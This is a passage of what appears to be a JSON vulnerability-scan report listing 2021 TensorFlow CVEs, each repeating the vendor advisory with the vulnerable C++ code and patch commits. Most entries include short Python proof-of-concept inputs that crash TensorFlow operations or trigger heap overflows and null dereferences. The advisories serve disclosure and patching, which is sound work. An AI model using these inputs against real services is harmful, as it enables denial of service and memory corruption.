[`InitDims`](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L212-L296) returns a non-OK status.\n\n```cc\ntemplate \u003cclass Shape\u003e\nTensorShapeBase\u003cShape\u003e::TensorShapeBase(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  set_tag(REP16);\n  set_data_type(DT_INVALID);\n  TF_CHECK_OK(InitDims(dim_sizes));\n}\n```\n\nIn our scenario, this occurs when adding a dimension from the argument results in overflow:\n\n```cc\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::InitDims(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  ...\n  Status status = Status::OK();\n  for (int64 s : dim_sizes) {\n    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));\n    if (!status.ok()) {\n      return status;\n    }\n  }\n}\n\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::AddDimWithStatus(int64 size) {\n  ...\n  int64 new_num_elements;\n  if (kIsPartial \u0026\u0026 (num_elements() \u003c 0 || size \u003c 0)) {\n    new_num_elements = -1;\n  } else {\n    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);\n    if (TF_PREDICT_FALSE(new_num_elements \u003c 0)) {\n        return errors::Internal(\"Encountered overflow when multiplying \",\n                                num_elements(), \" with \", size,\n                                \", result: \", new_num_elements);\n      }\n  }\n  ...\n}\n```\n\nThis is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.\n\n### Patches\nWe have patched the issue in GitHub commit [69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c](https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29568",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29568"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29568",
              "help": {
                "text": "Vulnerability CVE-2021-29568\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29568](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29568)\n### Impact\nAn attacker can trigger undefined behavior by binding to null pointer in `tf.raw_ops.ParameterizedTruncatedNormal`:\n\n```python\nimport tensorflow as tf\n    \nshape = tf.constant([], shape=[0], dtype=tf.int32)\nmeans = tf.constant((1), dtype=tf.float32)\nstdevs = tf.constant((1), dtype=tf.float32)\nminvals = tf.constant((1), dtype=tf.float32)\nmaxvals = tf.constant((1), dtype=tf.float32)\n  \ntf.raw_ops.ParameterizedTruncatedNormal(\n  shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/3f6fe4dfef6f57e768260b48166c27d148f3015f/tensorflow/core/kernels/parameterized_truncated_normal_op.cc#L630) does not validate input arguments before accessing the first element of `shape`:\n\n```cc\nint32 num_batches = shape_tensor.flat\u003cint32\u003e()(0);\n``` \n\nIf `shape` argument is empty, then `shape_tensor.flat\u003cT\u003e()` is an empty array.\n\n### Patches\nWe have patched the issue in GitHub commit [5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8](https://github.com/tensorflow/tensorflow/commit/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29568**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29568](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29568)|\n\n### Impact\nAn attacker can trigger undefined behavior by binding to null pointer in `tf.raw_ops.ParameterizedTruncatedNormal`:\n\n```python\nimport tensorflow as tf\n    \nshape = tf.constant([], shape=[0], dtype=tf.int32)\nmeans = tf.constant((1), dtype=tf.float32)\nstdevs = tf.constant((1), dtype=tf.float32)\nminvals = tf.constant((1), dtype=tf.float32)\nmaxvals = tf.constant((1), dtype=tf.float32)\n  \ntf.raw_ops.ParameterizedTruncatedNormal(\n  shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/3f6fe4dfef6f57e768260b48166c27d148f3015f/tensorflow/core/kernels/parameterized_truncated_normal_op.cc#L630) does not validate input arguments before accessing the first element of `shape`:\n\n```cc\nint32 num_batches = shape_tensor.flat\u003cint32\u003e()(0);\n``` \n\nIf `shape` argument is empty, then `shape_tensor.flat\u003cT\u003e()` is an empty array.\n\n### Patches\nWe have patched the issue in GitHub commit [5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8](https://github.com/tensorflow/tensorflow/commit/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29596",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29596"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29596",
              "help": {
                "text": "Vulnerability CVE-2021-29596\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29596](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29596)\nThe implementation of the `EmbeddingLookup` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/e4b29809543b250bc9b19678ec4776299dd569ba/tensorflow/lite/kernels/embedding_lookup.cc#L73-L74):\n\n```cc\nconst int row_size = SizeOfDimension(value, 0);\nconst int row_bytes = value-\u003ebytes / row_size;\n```\n\nAn attacker can craft a model such that the first dimension of the `value` input is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [f61c57bd425878be108ec787f4d96390579fb83e](https://github.com/tensorflow/tensorflow/commit/f61c57bd425878be108ec787f4d96390579fb83e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29596**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29596](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29596)|\n\nThe implementation of the `EmbeddingLookup` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/e4b29809543b250bc9b19678ec4776299dd569ba/tensorflow/lite/kernels/embedding_lookup.cc#L73-L74):\n\n```cc\nconst int row_size = SizeOfDimension(value, 0);\nconst int row_bytes = value-\u003ebytes / row_size;\n```\n\nAn attacker can craft a model such that the first dimension of the `value` input is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [f61c57bd425878be108ec787f4d96390579fb83e](https://github.com/tensorflow/tensorflow/commit/f61c57bd425878be108ec787f4d96390579fb83e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29542",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29542"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29542",
              "help": {
                "text": "Vulnerability CVE-2021-29542\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29542](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29542)\n### Impact\nAn attacker can cause a heap buffer overflow by passing crafted inputs to `tf.raw_ops.StringNGrams`:\n\n```python\nimport tensorflow as tf\n\nseparator = b`\"x02\"x00`    \nngram_widths = [7, 6, 11]\nleft_pad = b`\"x7f\"x7f\"x7f\"x7f\\x7f`\nright_pad = b`\"x7f\"x7f\"x25\"x5d\"x53\"x74`\npad_width = 50\npreserve_short_sequences = True\n  \nl = [``, ``, ``, ``, ``, ``, ``, ``, ``, ``, ``]\n  \ndata = tf.constant(l, shape=[11], dtype=tf.string)\n  \nl2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 3]\ndata_splits = tf.constant(l2, shape=[116], dtype=tf.int64)\n\nout = tf.raw_ops.StringNGrams(data=data,\n    data_splits=data_splits, separator=separator,\n    ngram_widths=ngram_widths, left_pad=left_pad,\n    right_pad=right_pad, pad_width=pad_width,\n    preserve_short_sequences=preserve_short_sequences)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L171-L185) fails to consider corner cases where input would be split in such a way that the generated tokens should only contain padding elements:\n  \n```cc\nfor (int ngram_index = 0; ngram_index \u003c num_ngrams; ++ngram_index) {\n  int pad_width = get_pad_width(ngram_width);\n  int left_padding = std::max(0, pad_width - ngram_index);\n  int right_padding = std::max(0, pad_width - (num_ngrams - (ngram_index + 1)));\n  int num_tokens = ngram_width - (left_padding + right_padding);\n  int data_start_index = left_padding \u003e 0 ? 0 : ngram_index - pad_width;\n  ...\n  tstring* ngram = \u0026output[ngram_index];\n  ngram-\u003ereserve(ngram_size);\n  for (int n = 0; n \u003c left_padding; ++n) {\n    ngram-\u003eappend(left_pad_);\n    ngram-\u003eappend(separator_);\n  }\n  for (int n = 0; n \u003c num_tokens - 1; ++n) {\n    ngram-\u003eappend(data[data_start_index + n]);\n    ngram-\u003eappend(separator_);\n  }\n  ngram-\u003eappend(data[data_start_index + num_tokens - 1]); // \u003c\u003c\u003c\n  for (int n = 0; n \u003c right_padding; ++n) {\n    ngram-\u003eappend(separator_);\n    ngram-\u003eappend(right_pad_);\n  }\n  ...\n}\n```\n\nIf input is such that `num_tokens` is 0, then, for `data_start_index=0` (when left padding is present), the marked line would result in reading `data[-1]`.\n\n### Patches\nWe have patched the issue in GitHub commit [ba424dd8f16f7110eea526a8086f1a155f14f22b](https://github.com/tensorflow/tensorflow/commit/ba424dd8f16f7110eea526a8086f1a155f14f22b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29542**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29542](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29542)|\n\n### Impact\nAn attacker can cause a heap buffer overflow by passing crafted inputs to `tf.raw_ops.StringNGrams`:\n\n```python\nimport tensorflow as tf\n\nseparator = b`\"x02\"x00`    \nngram_widths = [7, 6, 11]\nleft_pad = b`\"x7f\"x7f\"x7f\"x7f\\x7f`\nright_pad = b`\"x7f\"x7f\"x25\"x5d\"x53\"x74`\npad_width = 50\npreserve_short_sequences = True\n  \nl = [``, ``, ``, ``, ``, ``, ``, ``, ``, ``, ``]\n  \ndata = tf.constant(l, shape=[11], dtype=tf.string)\n  \nl2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 3]\ndata_splits = tf.constant(l2, shape=[116], dtype=tf.int64)\n\nout = tf.raw_ops.StringNGrams(data=data,\n    data_splits=data_splits, separator=separator,\n    ngram_widths=ngram_widths, left_pad=left_pad,\n    right_pad=right_pad, pad_width=pad_width,\n    preserve_short_sequences=preserve_short_sequences)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L171-L185) fails to consider corner cases where input would be split in such a way that the generated tokens should only contain padding elements:\n  \n```cc\nfor (int ngram_index = 0; ngram_index \u003c num_ngrams; ++ngram_index) {\n  int pad_width = get_pad_width(ngram_width);\n  int left_padding = std::max(0, pad_width - ngram_index);\n  int right_padding = std::max(0, pad_width - (num_ngrams - (ngram_index + 1)));\n  int num_tokens = ngram_width - (left_padding + right_padding);\n  int data_start_index = left_padding \u003e 0 ? 0 : ngram_index - pad_width;\n  ...\n  tstring* ngram = \u0026output[ngram_index];\n  ngram-\u003ereserve(ngram_size);\n  for (int n = 0; n \u003c left_padding; ++n) {\n    ngram-\u003eappend(left_pad_);\n    ngram-\u003eappend(separator_);\n  }\n  for (int n = 0; n \u003c num_tokens - 1; ++n) {\n    ngram-\u003eappend(data[data_start_index + n]);\n    ngram-\u003eappend(separator_);\n  }\n  ngram-\u003eappend(data[data_start_index + num_tokens - 1]); // \u003c\u003c\u003c\n  for (int n = 0; n \u003c right_padding; ++n) {\n    ngram-\u003eappend(separator_);\n    ngram-\u003eappend(right_pad_);\n  }\n  ...\n}\n```\n\nIf input is such that `num_tokens` is 0, then, for `data_start_index=0` (when left padding is present), the marked line would result in reading `data[-1]`.\n\n### Patches\nWe have patched the issue in GitHub commit [ba424dd8f16f7110eea526a8086f1a155f14f22b](https://github.com/tensorflow/tensorflow/commit/ba424dd8f16f7110eea526a8086f1a155f14f22b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29583",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29583"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29583",
              "help": {
                "text": "Vulnerability CVE-2021-29583\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29583](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29583)\n### Impact\nThe implementation of `tf.raw_ops.FusedBatchNorm` is vulnerable to a heap buffer overflow:\n      \n```python\nimport tensorflow as tf\n\nx = tf.zeros([10, 10, 10, 6], dtype=tf.float32)\nscale = tf.constant([0.0], shape=[1], dtype=tf.float32)\noffset = tf.constant([0.0], shape=[1], dtype=tf.float32)\nmean = tf.constant([0.0], shape=[1], dtype=tf.float32)\nvariance = tf.constant([0.0], shape=[1], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n    \ntf.raw_ops.FusedBatchNorm(\n  x=x, scale=scale, offset=offset, mean=mean, variance=variance,\n  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,\n  data_format=data_format, is_training=is_training)\n```\n  \nIf the tensors are empty, the same implementation can trigger undefined behavior by dereferencing null pointers:\n\n```python \nimport tensorflow as tf\nimport numpy as np\n\nx = tf.zeros([10, 10, 10, 1], dtype=tf.float32)\nscale = tf.constant([], shape=[0], dtype=tf.float32)\noffset = tf.constant([], shape=[0], dtype=tf.float32)\nmean = tf.constant([], shape=[0], dtype=tf.float32)\nvariance = tf.constant([], shape=[0], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n\ntf.raw_ops.FusedBatchNorm(\n  x=x, scale=scale, offset=offset, mean=mean, variance=variance, \n  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,\n  data_format=data_format, is_training=is_training)\n``` \n\nThe  [implementation](https://github.com/tensorflow/tensorflow/blob/57d86e0db5d1365f19adcce848dfc1bf89fdd4c7/tensorflow/core/kernels/fused_batch_norm_op.cc) fails to validate that `scale`, `offset`, `mean` and `variance` (the last two only when required) all have the same number of elements as the number of channels of `x`. This results in heap out of bounds reads when the buffers backing these tensors are indexed past their boundary.\n\nIf the tensors are empty, the validation mentioned in the above paragraph would also trigger and prevent the undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [6972f9dfe325636b3db4e0bc517ee22a159365c0](https://github.com/tensorflow/tensorflow/commit/6972f9dfe325636b3db4e0bc517ee22a159365c0).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29583**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29583](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29583)|\n\n### Impact\nThe implementation of `tf.raw_ops.FusedBatchNorm` is vulnerable to a heap buffer overflow:\n      \n```python\nimport tensorflow as tf\n\nx = tf.zeros([10, 10, 10, 6], dtype=tf.float32)\nscale = tf.constant([0.0], shape=[1], dtype=tf.float32)\noffset = tf.constant([0.0], shape=[1], dtype=tf.float32)\nmean = tf.constant([0.0], shape=[1], dtype=tf.float32)\nvariance = tf.constant([0.0], shape=[1], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n    \ntf.raw_ops.FusedBatchNorm(\n  x=x, scale=scale, offset=offset, mean=mean, variance=variance,\n  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,\n  data_format=data_format, is_training=is_training)\n```\n  \nIf the tensors are empty, the same implementation can trigger undefined behavior by dereferencing null pointers:\n\n```python \nimport tensorflow as tf\nimport numpy as np\n\nx = tf.zeros([10, 10, 10, 1], dtype=tf.float32)\nscale = tf.constant([], shape=[0], dtype=tf.float32)\noffset = tf.constant([], shape=[0], dtype=tf.float32)\nmean = tf.constant([], shape=[0], dtype=tf.float32)\nvariance = tf.constant([], shape=[0], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n\ntf.raw_ops.FusedBatchNorm(\n  x=x, scale=scale, offset=offset, mean=mean, variance=variance, \n  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,\n  data_format=data_format, is_training=is_training)\n``` \n\nThe  [implementation](https://github.com/tensorflow/tensorflow/blob/57d86e0db5d1365f19adcce848dfc1bf89fdd4c7/tensorflow/core/kernels/fused_batch_norm_op.cc) fails to validate that `scale`, `offset`, `mean` and `variance` (the last two only when required) all have the same number of elements as the number of channels of `x`. This results in heap out of bounds reads when the buffers backing these tensors are indexed past their boundary.\n\nIf the tensors are empty, the validation mentioned in the above paragraph would also trigger and prevent the undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [6972f9dfe325636b3db4e0bc517ee22a159365c0](https://github.com/tensorflow/tensorflow/commit/6972f9dfe325636b3db4e0bc517ee22a159365c0).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29550",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29550"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29550",
              "help": {
                "text": "Vulnerability CVE-2021-29550\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29550](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29550)\n### Impact\nAn attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.FractionalAvgPool`:\n\n```python\nimport tensorflow as tf\n\nvalue = tf.constant([60], shape=[1, 1, 1, 1], dtype=tf.int32)\npooling_ratio = [1.0, 1.0000014345305555, 1.0, 1.0]\npseudo_random = False\noverlapping = False\ndeterministic = False\nseed = 0\nseed2 = 0\n\ntf.raw_ops.FractionalAvgPool(\n  value=value, pooling_ratio=pooling_ratio, pseudo_random=pseudo_random,\n  overlapping=overlapping, deterministic=deterministic, seed=seed, seed2=seed2)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c/tensorflow/core/kernels/fractional_avg_pool_op.cc#L85-L89) computes a divisor quantity by dividing two user controlled values:\n\n```cc                     \nfor (int i = 0; i \u003c tensor_in_and_out_dims; ++i) {\n  output_size[i] = static_cast\u003cint\u003e(std::floor(input_size[i] / pooling_ratio_[i]));\n  DCHECK_GT(output_size[i], 0); \n} \n``` \n    \nThe user controls the values of `input_size[i]` and `pooling_ratio_[i]` (via the `value.shape()` and `pooling_ratio` arguments). If the value in `input_size[i]` is smaller than the `pooling_ratio_[i]`, then the floor operation results in `output_size[i]` being 0. The `DCHECK_GT` line is a no-op outside of debug mode, so in released versions of TF this does not trigger.\n\nLater, these computed values [are used as arguments](https://github.com/tensorflow/tensorflow/blob/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c/tensorflow/core/kernels/fractional_avg_pool_op.cc#L96-L99) to [`GeneratePoolingSequence`](https://github.com/tensorflow/tensorflow/blob/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c/tensorflow/core/kernels/fractional_pool_common.cc#L100-L108). There, the first computation is a division in a modulo operation:\n\n```cc\nstd::vector\u003cint64\u003e GeneratePoolingSequence(int input_length, int output_length,\n                                           GuardedPhiloxRandom* generator,\n                                           bool pseudo_random) {\n  ...\n  if (input_length % output_length == 0) {\n    diff = std::vector\u003cint64\u003e(output_length, input_length / output_length);\n  }\n  ...\n}\n```\n\nSince `output_length` can be 0, this results in runtime crashing.\n\n### Patches\nWe have patched the issue in GitHub commit [548b5eaf23685d86f722233d8fbc21d0a4aecb96](https://github.com/tensorflow/tensorflow/commit/548b5eaf23685d86f722233d8fbc21d0a4aecb96).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29550**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29550](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29550)|\n\n### Impact\nAn attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.FractionalAvgPool`:\n\n```python\nimport tensorflow as tf\n\nvalue = tf.constant([60], shape=[1, 1, 1, 1], dtype=tf.int32)\npooling_ratio = [1.0, 1.0000014345305555, 1.0, 1.0]\npseudo_random = False\noverlapping = False\ndeterministic = False\nseed = 0\nseed2 = 0\n\ntf.raw_ops.FractionalAvgPool(\n  value=value, pooling_ratio=pooling_ratio, pseudo_random=pseudo_random,\n  overlapping=overlapping, deterministic=deterministic, seed=seed, seed2=seed2)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c/tensorflow/core/kernels/fractional_avg_pool_op.cc#L85-L89) computes a divisor quantity by dividing two user controlled values:\n\n```cc                     \nfor (int i = 0; i \u003c tensor_in_and_out_dims; ++i) {\n  output_size[i] = static_cast\u003cint\u003e(std::floor(input_size[i] / pooling_ratio_[i]));\n  DCHECK_GT(output_size[i], 0); \n} \n``` \n    \nThe user controls the values of `input_size[i]` and `pooling_ratio_[i]` (via the `value.shape()` and `pooling_ratio` arguments). If the value in `input_size[i]` is smaller than the `pooling_ratio_[i]`, then the floor operation results in `output_size[i]` being 0. The `DCHECK_GT` line is a no-op outside of debug mode, so in released versions of TF this does not trigger.\n\nLater, these computed values [are used as arguments](https://github.com/tensorflow/tensorflow/blob/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c/tensorflow/core/kernels/fractional_avg_pool_op.cc#L96-L99) to [`GeneratePoolingSequence`](https://github.com/tensorflow/tensorflow/blob/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c/tensorflow/core/kernels/fractional_pool_common.cc#L100-L108). There, the first computation is a division in a modulo operation:\n\n```cc\nstd::vector\u003cint64\u003e GeneratePoolingSequence(int input_length, int output_length,\n                                           GuardedPhiloxRandom* generator,\n                                           bool pseudo_random) {\n  ...\n  if (input_length % output_length == 0) {\n    diff = std::vector\u003cint64\u003e(output_length, input_length / output_length);\n  }\n  ...\n}\n```\n\nSince `output_length` can be 0, this results in runtime crashing.\n\n### Patches\nWe have patched the issue in GitHub commit [548b5eaf23685d86f722233d8fbc21d0a4aecb96](https://github.com/tensorflow/tensorflow/commit/548b5eaf23685d86f722233d8fbc21d0a4aecb96).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun 